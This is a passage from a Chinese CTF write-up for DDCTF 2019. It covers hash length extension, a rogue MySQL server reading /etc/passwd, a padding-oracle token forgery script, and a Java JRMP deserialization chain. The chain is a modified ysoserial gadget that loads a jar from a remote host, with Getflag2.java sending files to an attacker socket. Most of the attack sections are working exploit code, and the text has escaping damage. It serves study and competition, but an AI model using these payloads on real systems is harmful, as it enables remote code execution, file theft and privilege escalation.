flag = '''DDCTF`{`chiken_dinner_hyMCX[n47Fx)`}`'''

def register():

    result = []
    user_name = request.args.get('name')
    password = request.args.get('password')

    if not user_name or not password:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        return response
    if not len(password)&gt;=8:
        response = jsonify(`{`"code": 404, "msg": "密码必须大于等于8位", "data": []`}`)
        return response
    else:
        hash_val = get_md5(user_name, 'DDCTF_2019')

        if not mydb.get_collection('account').find_one(`{`'user_name': user_name`}`):
            mydb.get_collection('account').insert_one(`{`'user_name': user_name, 'password' :password, 'balance': 100,
                                                       'hash_val': hash_val, 'flag': 'test'`}`)
            tmp_result = `{`'user_name': user_name, 'account': 100`}`
            result.append(tmp_result)
            response = jsonify(`{`"code": 200, "msg": "用户注册成功", "data": result`}`)
            response.set_cookie('user_name', user_name)
            response.set_cookie('REVEL_SESSION', hash_val)
            response.headers['Server'] = 'Caddy'
            return response
        else:
            response = jsonify(`{`"code": 404, "msg": "用户已存在", "data": []`}`)
            response.set_cookie('user_name', user_name)
            response.set_cookie('REVEL_SESSION', hash_val)
            response.headers['Server'] = 'Caddy'
            return response

def login():

    result = []
    user_name = request.args.get('name')
    password = request.args.get('password')

    if not user_name or not password:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        return response
    if not mydb.get_collection('account').find_one(`{`'user_name': user_name`}`):
        response = jsonify(`{`"code": 404, "msg": "该用户未注册", "data": result`}`)
        return response
    if not password == mydb.get_collection('account').find_one(`{`'user_name': user_name`}`)['password']:
        response = jsonify(`{`"code": 404, "msg": "密码错误", "data": result`}`)
        return response
    else:
        hash_val = mydb.get_collection('account').find_one(`{`'user_name': user_name`}`)['hash_val']
        response = jsonify(`{`"code": 200, "msg": "登陆成功", "data": result`}`)
        response.set_cookie('user_name', user_name)
        response.set_cookie('REVEL_SESSION', hash_val)
        response.headers['Server'] = 'Caddy'
        return response

def get_user_balance():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify(`{`"code": 404, "msg": "您未登陆", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    else:
        str_md5 = get_md5(user_name, 'DDCTF_2019')
        if hash_val == str_md5:
            balance = get_balance(user_name)
            bill_id  = get_bill_id(user_name)
            tmp_dic = `{`'balance': balance , 'bill_id': bill_id`}`
            result.append(tmp_dic)
            return jsonify(`{`"code": 200, "msg": "查询成功", "data": result`}`)
        else:
            return jsonify(`{`"code": 404, "msg": "参数错误", "data": []`}`)

def buy_ticket():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    ticket_price = int(request.args.get('ticket_price'))
    if not user_name or not hash_val or not ticket_price:
        response = jsonify(`{`"code": 404, "msg": "参数错误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    if ticket_price &lt; 1000:
        response = jsonify(`{`"code": 200, "msg": "ticket门票价格为2000", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    if search_bill(user_name):
        tmp_list = []
        bill_tmp = `{`'bill_id': search_bill(user_name)`}`
        tmp_list.append(bill_tmp)
        response = jsonify(`{`"code": 200, "msg": "请支付未完成订单", "data": tmp_list`}`)
        response.headers['Server'] = 'Caddy'
        return response
    else:
        # 生成uuid 保存订单
        hash_id = str(uuid.uuid4())
        tmp_dic = `{`'user_name': user_name, 'ticket_price': ticket_price, 'bill_id': hash_id`}`
        mydb.get_collection('bill').insert_one(tmp_dic)
        result.append(`{`'user_name': user_name, 'ticket_price': ticket_price, 'bill_id': hash_id`}`)
        response = jsonify(`{`"code": 200, "msg": "购买门票成功", "data": result`}`)
        response.headers['Server'] = 'Caddy'
        return response

def search_bill_info():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify(`{`"code": 404, "msg": "您未登陆", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    else:
        str_md5 = get_md5(user_name, 'DDCTF_2019')
        if hash_val == str_md5:
            tmp = mydb.get_collection('bill').find_one(`{`'user_name': user_name`}`)
            if not tmp:
                return jsonify(`{`"code": 200, "msg": "不存在订单", "data": result`}`)
            bill_id = tmp['bill_id']
            user_name =user_name
            bill_price = tmp['ticket_price']
            tmp_dic = `{`'user_name': user_name, 'bill_id': bill_id, 'bill_price': bill_price`}`
            result.append(tmp_dic)
            return jsonify(`{`"code": 200, "msg": "查询成功", "data": result`}`)
        else:
            return jsonify(`{`"code": 404, "msg": "参数错误", "data": []`}`)


def recall_bill():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    bill_id = request.args.get('bill_id')
    if not user_name or not hash_val:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    tmp =mydb.get_collection('bill').find_one(`{`'bill_id': bill_id`}`)
    if not tmp:
        response = jsonify(`{`"code": 404, "msg": "订单号不存在", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    if tmp['user_name'] != user_name:
        response = jsonify(`{`"code": 404, "msg": "订单号不存在", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    else:
        mydb.get_collection('bill').delete_one(`{`'bill_id': bill_id`}`)
        tmp_result = `{`'user_name': tmp['user_name'], 'bill_id': tmp['bill_id'], 'ticket_price': tmp['ticket_price']`}`
        result.append(tmp_result)
        response = jsonify(`{`"code": 200, "msg": "订单已取消", "data": result`}`)
        response.headers['Server'] = 'Caddy'
        return response


def pay_ticket():

    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    bill_id = request.args.get('bill_id')
    if not user_name or not hash_val or not bill_id:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
         response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误", "data": []`}`)
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response
    tmp_obj = mydb.get_collection('bill').find_one(`{`'bill_id':bill_id`}`)
    if not tmp_obj:
        response = jsonify(`{`"code": 404, "msg": "订单信息有误", "data": []`}`)
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response
    tmp_price = mydb.get_collection('bill').find_one(`{`'user_name': user_name`}`)['ticket_price']
    tmp_bill_uuid = mydb.get_collection('bill').find_one(`{`'bill_id': bill_id`}`)['bill_id']
    price = num64_to_32(tmp_price)
    tmp_account = mydb.get_collection('account').find_one(`{`'user_name': user_name`}`)['balance']
    if tmp_bill_uuid == bill_id:
        if tmp_account &gt;= price:
            if mydb.get_collection('user_env').find_one(`{`'user_name': user_name`}`):
                tmp = mydb.get_collection('user_env').find_one(`{`'user_name': user_name`}`)['user_info_list']
                for item in tmp:
                    if item['user_name'] == user_name:
                        result.append(item)
                    else:
                        pass
                    response = jsonify(`{`"code": 200, "msg": "已购买ticket", "data": result`}`)
                    response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
                    response.headers['X-Powered-By'] = ' Servlet/3.0'
                return response
            else:
                account = tmp_account - price
                mydb.get_collection('account').update_one(`{`'user_name': user_name`}`, `{`'$set': `{`'balance': account`}``}`,
                                                          upsert=True)
                mydb.get_collection('bill').delete_one(`{`'bill_id': bill_id`}`)
                tmp_info = creat_env_db(user_name)
                mydb.get_collection('user_env').insert_one(tmp_info[0])
                tmp_result = `{`'your_ticket': tmp_info[1]['hash_val'], 'your_id': tmp_info[1]['id']`}`
                result.append(tmp_result)
                response = jsonify(`{`"code": 200, "msg": "交易成功", "data": result`}`)
                response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
                response.headers['X-Powered-By'] = ' Servlet/3.0'
                return response
        else:
            response = jsonify(`{`"code": 200, "msg": "余额不足", "data": []`}`)
            response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
            response.headers['X-Powered-By'] = ' Servlet/3.0'
            return response
    else:
        response = jsonify(`{`"code": 200, "msg": "订单信息有误", "data": []`}`)
        response.headers['Pay-Server'] = 'Apache-Coyote/1.1'
        response.headers['X-Powered-By'] = ' Servlet/3.0'
        return response

def is_login():
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response
    response = jsonify(`{`"code": 200, "msg": "您已登陆", "data": []`}`)
    return response


def search_ticket():
    result = []
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    if not user_name or not hash_val:
        response = jsonify(`{`"code": 404, "msg": "参数不能为空", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    tmp = mydb.get_collection('user_env').find_one(`{`'user_name': user_name`}`)

    if not tmp:
        response = jsonify(`{`"code": 404, "msg": "你还未获取入场券", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    if tmp:
        tmp_dic = `{`'ticket': tmp['player_info']['hash_val'], 'id': tmp['player_info']['id']`}`
        result.append(tmp_dic)
        response = jsonify(`{`"code": 200, "msg": "ticket信息", "data": result`}`)
        response.headers['Server'] = 'Caddy'
        return response


def remove_robot():

    result = []
    sign_str = ''
    user_name = request.cookies.get('user_name')
    hash_val = request.cookies.get('REVEL_SESSION')
    a = request.environ['QUERY_STRING']
    params_list = []
    for item in a.split('&amp;'):
        k, v = item.split('=')
        params_list.append((k, v))

    user_id = request.args.get('id')
    ticket = request.args.get('ticket')

    if not user_name or not hash_val or not user_id or not ticket:
        response = jsonify(`{`"code": 404, "msg": "参数错误", "data": []`}`)
        response.headers['Server'] = 'Caddy'
        return response

    # if not str.isdigit(user_id):
    #     return jsonify(`{`"code": 0, "msg": "参数错误", "data": []`}`)

    str_md5 = get_md5(user_name, 'DDCTF_2019')
    if hash_val != str_md5:
        response = jsonify(`{`"code": 404, "msg": "登陆信息有误"
```

读一下tools.py可以看到出题人费劲心机模拟golang，看样子也是想考hash长度扩展攻击的

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2/1/2019 10:47 PM
# @Author  : fz
# @Site    : 
# @File    : tools.py
# @Software: PyCharm

import decimal
import datetime
import types
import hashlib
from flask.json import JSONEncoder
from urllib import unquote
from urllib import quote_plus

secrity_key = 'Winner, winner, chicken dinner!'

def pretty_floats(obj):
    if isinstance(obj, float) or isinstance(obj, decimal.Decimal):
        return round(obj, 2)
    elif isinstance(obj, dict):
        return dict((k, pretty_floats(v)) for k, v in obj.iteritems())
    elif isinstance(obj, (list, tuple)):
        return map(pretty_floats, obj)
    return obj


# 空值变为0
def pretty_data(obj):
    if isinstance(obj, types.NoneType) or obj == "":
        return 0
    elif isinstance(obj, dict):
        return dict((k, pretty_data(v)) for k, v in obj.iteritems())
    elif isinstance(obj, (list, tuple)):
        return map(pretty_data, obj)
    return obj


class CustomJSONEncoder(JSONEncoder):

    def default(self, obj):
        try:
            if isinstance(obj, datetime.datetime) or isinstance(obj, datetime.date):
                encoded_object = obj.strftime('%Y-%m-%d')
                return encoded_object
            iterable = iter(obj)
        except TypeError:
            pass
        else:
            return list(iterable)
        return JSONEncoder.default(self, obj)


#
def percent_div(up, down):
    if up == 0 or up is None:
        return 0
    try:
        return round((up / down) * 100, 2)
    except ZeroDivisionError:
        return 0

#
def num64_to_32(num):

    str_num = bin(num)
    if len(str_num) &gt; 66:
        return False
    if 34 &lt; len(str_num) &lt; 66:
        str_64 = str_num[-32:]
        result = int(str_64, 2)
        return result
    if len(str_num) &lt; 34:
        result = int(str_num, 2)
        return result
#
def get_md5(string, secret_key):
    m = hashlib.md5()
    m.update(secret_key+string)
    return m.hexdigest()


if __name__ == "__main__":

    print get_md5('id137', 'Winner, winner, chicken dinner!')
    print get_md5('id80', secrity_key)
    str = unquote('id80%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%01%00%00%00%00%00%00id51')
    str_new = secrity_key + str
    print str_new
    print ('''id80\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x01\x00\x00\x00\x00\x00\x00id51''')
    print quote_plus('''
    ''')
```





## 0x07：mysql弱口令

题目链接：http://117.51.147.155:5000/index.html#/scan 题目的逻辑大概是，在vps运行agent.py，这个服务器会列出vps上的进程信息，然后在题目页面输入自己mysql的端口号，扫描器会先来访问agent.py监听端口check是否会有mysqld进程，如果有那么进行弱口令测试。

这种反击mysql扫描器的思路感觉之前已经被出过很几次了，最早看到的中文分析文章是lightless师傅的这篇 https://lightless.me/archives/read-mysql-client-file.html 具体的工具可以参看这篇 https://www.freebuf.com/vuls/188910.html 打一个poc

```
set mysql.server.infile /etc/passwd; mysql.server off; mysql.server on;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01414e640b5e1b141f.png)

读取三种常见的history .bash_history（这里有个非预期后面会讲），.vim_history, .mysql.history 。 mysql历史里面有flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d9754d2a9ef71f68.png)



## 0x08：再来1杯Java

题目链接：116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com

在/api/account_info可以看到权限信息

[![](https://p5.ssl.qhimg.com/t0178bbfe378e03bb20.png)](https://p5.ssl.qhimg.com/t0178bbfe378e03bb20.png)

bae64解密token可以看到token的提示是oracle padding cbc

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bd9a87b14561d8cc.png)

这里思路应该是通过[padding oracle](https://k1n9.me/search/padding/)把roleAdmin改为true，具体思路是使用精心构造的iv控制第一段解密出的明文，用第二段密文控制第三段明文内容，中间的脏字符从第一段和第三段明文中匀出双引号包裹，大概样子如下图。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01721ef5de41b95c76.png)

这种思路下其实还是超长了，当时想的苟一苟把true改成1，结果就可以了（java不是强类型吗？是fastjson的问题？），脚本如下

```
from Crypto.Util.strxor import strxor
from base64 import *
import requests
#pip install pycrypto


def xor(a, b):
    return chr(ord(a)^ord(b))

def get_source_code(url, cipher):
    session = requests.Session()
    session.cookies['token'] = cipher
    web = session.get(url)
    return web.text

url = 'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info'

str = 'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'

token = b64decode(str)

iv = token[:16]
C1 = token[16:32]
C2 = token[32:]
raw_iv = 'PadOracle:iv/cbc'

json = '`{`"id":100,"roleAdmin":false`}`'
D_C1 = strxor(json[:16], raw_iv)


cipher = strxor(strxor(iv, json[:16]), '`{`"roleAdmin":1,"')+C1+strxor(strxor(C2, strxor(D_C1, C2)), '":"1","id":001`}`'+chr(1))+C1
cipher = b64encode(cipher)
state = get_source_code(url, cipher)
print state
print cipher
```

抓包改一下即可来到管理员界面

[![](https://p2.ssl.qhimg.com/t01a65a7c80dae10e6f.png)](https://p2.ssl.qhimg.com/t01a65a7c80dae10e6f.png)

其中1.txt给了一些hint

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01777770fe96be7249.png)

同时filename存在任意文件读取漏洞，跑一下常见路径可以拿到一份源码泄漏

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012cb0b1548f672eb7.png)

审计一下代码可以看到虽然项目使用的是有漏洞的commons-collections并且还存在一个明显的反序列化点，不过不幸的是在反序列化之前用[SerialKiller](https://github.com/ikkisoft/SerialKiller)对反序列化出来的类做了黑名单处理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b582e213f8880ada.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0163b2e82626925041.png)

一开始的思路是用最近出的工具gadget-inspector.jar自动化寻找新的gadget，但是没有找到。。。

等到中午的时候官方放了提示说是利用jrmp，在先知上找到一片文章[Weblogic JRMP反序列化漏洞回顾](https://xz.aliyun.com/t/2479)，在CVE-2018-？那里作者给出了一个payload我发现稍微改一下打到服务器那边就会有反应。

```
import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import javax.naming.ConfigurationException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.rmi.server.ObjID;
import java.util.Random;

public class Poc `{`
    public static void main(String[] args) throws IOException, ClassNotFoundException, ConfigurationException, Base64DecodingException `{`

        String host;
        int port;
        host = "ip";
        port = 1099;

        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(out);
        objectOutputStream.writeObject(stub);

        System.out.println(java.util.Base64.getEncoder().encodeToString(out.toByteArray()).toString());
    `}`
`}`
```

服务器监听可以成功接受到请求

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01bd2aa8e50a3daf51.png)

下面要做的就是用ysoserial开一个jrmp监听，把真正的payload回传给服务器。虽然构造用的gadget是走commons-collections但是这里不过serialkiller所以不会被拦截。因为之前提示说过这个环境不能执行命令，所以需要自己在ysoserial中自定义个一个反射链，[随风师傅博客中提到的classloder方案](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)

最后代码如下 CommonsCollections7.java

```
package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
    Gadget chain:
       ObjectInputStream.readObject()
           AnnotationInvocationHandler.readObject()
              Map(Proxy).entrySet()
                  AnnotationInvocationHandler.invoke()
                     LazyMap.get()
                         ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                   Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                   Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                   Runtime.exec()

    Requires:
       commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
//@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
SuppressWarnings(`{`"rawtypes", "unchecked"`}`)
PayloadTest ( precondition = "isApplicableJavaVersion")
Dependencies(`{`"commons-collections:commons-collections:3.1"`}`)
Authors(`{` Authors.MATTHIASKAISER, Authors.JASINNER `}`)
public class CommonsCollections7 extends PayloadRunner implements ObjectPayload&lt;BadAttributeValueExpException&gt; `{`

    public BadAttributeValueExpException getObject(final String fileName) throws Exception `{`
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]`{` new ConstantTransformer(1) `}`);
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] `{`
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] `{` Class[].class `}`,
                new Object[] `{` new Class[] `{` java.net.URL[].class `}` `}`),
            // newinstance string http://www.iswin.org/attach/iswin.jar
            new InvokerTransformer(
                "newInstance",
                new Class[] `{` Object[].class `}`,
                new Object[] `{` new Object[] `{` new java.net.URL[] `{` new java.net.URL(
                    "http://ip:8080/getflag2.jar") `}` `}` `}`),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] `{` String.class `}`, new Object[] `{` "getflag2" `}`),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] `{` Class[].class `}`,
                new Object[] `{` new Class[] `{` String.class `}` `}`),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] `{` Object[].class `}`,
                new Object[] `{` new String[] `{` fileName `}` `}`),
            new ConstantTransformer(1) `}`;

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    `}`

    public static void main(final String[] args) throws Exception `{`
        PayloadRunner.run(CommonsCollections7.class, args);
    `}`

    public static boolean isApplicableJavaVersion() `{`
        return JavaVersion.isBadAttrValExcReadObj();
    `}`

`}`
```

重新打包后丢到自己的vps上，顺便在在vps打包一个getflag2.jar Getflag2.java

```
import java.io.*;
import java.net.Socket;

public class Getflag2 `{`
    public Getflag2(String fileName) `{`
        try `{`

            Socket socket = new Socket("ip", 8080);
            OutputStream socketOutputStream = socket.getOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(socketOutputStream);

            File file = new File(fileName);

            if (file.isDirectory()) `{`
                for (File temp : file.listFiles()) `{`
                    dataOutputStream.writeUTF(temp.toString());
                `}`
            `}` else `{`
                FileInputStream fileInputStream = new FileInputStream(file);
                InputStreamReader inputStreamReader = new InputStreamReader(fileInputStream);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);

                String line;
                while ((line = bufferedReader.readLine()) != null) `{`
                    dataOutputStream.writeUTF(line);
                `}`
            `}`
            dataOutputStream.flush();


        `}` catch (FileNotFoundException e) `{`
            e.printStackTrace();
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

然后在服务端上开一个web服务提供getflag2.jar的下载，再开一个jrmp就可以看是随缘读flag了。

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections7 '/etc/passwd'
```

最后找到flag在根目录的flag文件夹下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0176bc841362022d27.png)

补充说明 为什么ObjId没有被拦截，比赛时能打就没管了，如果分析错了请师傅们指正，表象是ObJid是并没有在序列化内容里面

[![](https://p0.ssl.qhimg.com/t01f205f67514fbfed7.png)](https://p0.ssl.qhimg.com/t01f205f67514fbfed7.png)

本质上是最后序列化的点在RemoteObject里面执行了writeObject

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014fcb5e28a28e1e1c.png)

在RemoteObject这里ref是传入的UnicastRef对象

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016aa1d298dd6467dd.png)

跟踪进入UnicastRef的writeExternal

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c4e5611b1d7ee50e.png)

在UnicastRef这里ref是外部传入的LiveRef

[![](https://p3.ssl.qhimg.com/t0190142f31e982077e.png)](https://p3.ssl.qhimg.com/t0190142f31e982077e.png)

查看LiveRef的write方法，这里标红的id就是Objid。

[![](https://p3.ssl.qhimg.com/t018309b64a93385b74.png)](https://p3.ssl.qhimg.com/t018309b64a93385b74.png)

最后查看ObjId的write

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b47513f75f98accd.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015e112c1466646f66.png)

最后写入的是一个long型数字和ObjId类型没关系。



想了解更多 题目出题人视角解析，请关注：滴滴安全应急响应中心（DSRC）公众号查看：

